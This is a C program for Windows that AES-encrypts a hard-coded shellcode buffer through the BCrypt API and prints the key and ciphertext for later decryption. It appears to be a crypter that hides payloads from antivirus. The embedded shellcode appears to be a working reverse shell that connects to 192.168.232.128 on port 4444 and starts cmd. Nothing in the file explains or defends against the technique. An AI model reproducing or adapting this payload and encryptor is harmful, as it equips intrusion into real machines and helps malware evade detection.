# include <windows.h>
# include <stdio.h>
# include <bcrypt.h>


static const BYTE secret[] =
{
    0x68, 0x65, 0x6c, 0x6c, 0x6f, 0x69, 0x73, 0x73, 
    0x73, 0x73, 0x73, 0x73, 0x73, 0x73, 0x73, 0x73
};

//change the shellcode here
unsigned char plaintext[]="\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x05\x68\xc0\xa8\xe8\x80\x68\x02\x00\x11\x5c\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75\xec\x68\xf0\xb5\xa2\x56\xff\xd5\x68\x63\x6d\x64\x00\x89\xe3\x57\x57\x57\x31\xf6\x6a\x12\x59\x56\xe2\xfd\x66\xc7\x44\x24\x3c\x01\x01\x8d\x44\x24\x10\xc6\x00\x44\x54\x50\x56\x56\x56\x46\x56\x4e\x56\x56\x53\x56\x68\x79\xcc\x3f\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff\x30\x68\x08\x87\x1d\x60\xff\xd5\xbb\xe0\x1d\x2a\x0a\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5";
void ErrorMessagess(DWORD status){
    char buffer[256];
    FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,NULL,status,MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),buffer,sizeof(buffer)/sizeof(char),NULL);
    printf("[+] Error is %s ", buffer);
}

int main()
{
   BCRYPT_ALG_HANDLE phalgorithm;
   LPCWSTR pszAlgId=L"AES";
   LPCWSTR pszImplementation=NULL;

   BCRYPT_KEY_HANDLE phkey;
   DWORD pbOutput;
   LPCWSTR pszProperty = L"ObjectLength";
   ULONG dwFlags=0;
   ULONG pcbresult;


   HANDLE getprocessheap=GetProcessHeap();
   LPVOID heapmemoryKey;
   DWORD ciphertext_size = 0;

   LPVOID heapmemory_plaintext,heapmemory_ciphertext;
   PUCHAR ciphertext;
   ULONG pcbresult_finalencryption;
   NTSTATUS status;
   DWORD dwStatusError=GetLastError();

   ULONG pcbresult_key;
   ULONG pcbresult_keynew;

   if((status=BCryptOpenAlgorithmProvider(&phalgorithm,BCRYPT_AES_ALGORITHM,NULL,0)) != 0){
       printf("[+] Error Occured while Getting Handle to CSP: %X\n",status);
       ErrorMessagess(dwStatusError);
       exit(0);
   }
   if((status=BCryptGetProperty(phalgorithm,BCRYPT_OBJECT_LENGTH,(PUCHAR)&pbOutput,sizeof(DWORD),&pcbresult,dwFlags)) !=0) {
       printf("[+] Error Occured while Getting Key property of Algorithm: %X\n",status);
       exit(0);
    }
   heapmemoryKey=HeapAlloc(getprocessheap,HEAP_GENERATE_EXCEPTIONS,pbOutput);

   printf("[+]Size of the Generated key is :%d\n",pbOutput);

  
   if((status=BCryptSetProperty(phalgorithm,BCRYPT_CHAINING_MODE,(PBYTE)BCRYPT_CHAIN_MODE_CBC,sizeof(BCRYPT_CHAIN_MODE_CBC),0)) != 0){
      printf("[+] Error Occured while setting property of Algorithm: %X\n",status);
      exit(0);
   }
   
   if((status=BCryptGenerateSymmetricKey(phalgorithm,&phkey,(PUCHAR)heapmemoryKey,(ULONG)pbOutput,(PUCHAR)secret,sizeof(secret),0)) != 0){
      printf("[+] Error Occured while Generating Keys: %X\n",status);
      exit(0);    
   }

   if((status=BCryptExportKey(phkey,NULL,BCRYPT_KEY_DATA_BLOB,NULL,0,&pcbresult_key,0)) !=0){
      printf("[+] Error: %X\n",status);
      exit(0);    
   }
   LPVOID heapmemory_key=HeapAlloc(getprocessheap,HEAP_GENERATE_EXCEPTIONS,pcbresult_key);
   if((BCryptExportKey(phkey,NULL,BCRYPT_KEY_DATA_BLOB,(PUCHAR)heapmemory_key,pcbresult_key,&pcbresult_keynew,0)) !=0){
     printf("[+] Error Occured While Exporting the Keys: %X\n",status);
     exit(0);
   }
   printf("[+] Printing Key for Decrypting CipherText\n");
   for(int i=0;i<pcbresult_key;i++){
       printf("0x%02x,", ((PUCHAR)heapmemory_key)[i]);
   }
   printf("\n");
   // Allocating memory for plaintext
   heapmemory_plaintext=(PUCHAR)HeapAlloc(getprocessheap,HEAP_GENERATE_EXCEPTIONS,(DWORD)sizeof(plaintext));

   //transferring buffer from plaintext to heapmemory_plaintext
   memcpy(heapmemory_plaintext,(CONST VOID*)&plaintext,sizeof(plaintext));

   //getting size of encrypted data
   
   if((status=BCryptEncrypt(phkey,(PUCHAR)heapmemory_plaintext,(ULONG)sizeof(plaintext),NULL,NULL,0,NULL,0,&ciphertext_size,BCRYPT_BLOCK_PADDING)) != 0){
       printf("[+] Error Occured while Gettign Size of encrypted Text : %X\n",status);
       exit(0);
   }
 
   heapmemory_ciphertext=HeapAlloc(getprocessheap,HEAP_GENERATE_EXCEPTIONS,ciphertext_size);
   //encrypting the data
   if((status=BCryptEncrypt(phkey,(PUCHAR)heapmemory_plaintext,(ULONG)sizeof(plaintext),NULL,NULL,0,(PUCHAR)heapmemory_ciphertext,ciphertext_size,&pcbresult_finalencryption,BCRYPT_BLOCK_PADDING)) !=0){
       printf("[+] Error Occured while Encrypting the Text : %X\n",status);
       exit(0);        
   }
   
   printf("[+] Printing Encrypted Text\n");
   for (DWORD i = 0; i < ciphertext_size; i++) {
    printf("0x%02x,", ((PUCHAR)heapmemory_ciphertext)[i]); 
   }
  
    if(phalgorithm)
    {
        BCryptCloseAlgorithmProvider(phalgorithm,0);
    }

    if (phkey)    
    {
        BCryptDestroyKey(phkey);
    }


    if(heapmemory_plaintext)
    {
        HeapFree(GetProcessHeap(), 0, heapmemory_plaintext);
    }

    if(heapmemory_key)
    {
        HeapFree(GetProcessHeap(), 0, heapmemory_key);
    }

 
   return 1;
}



   


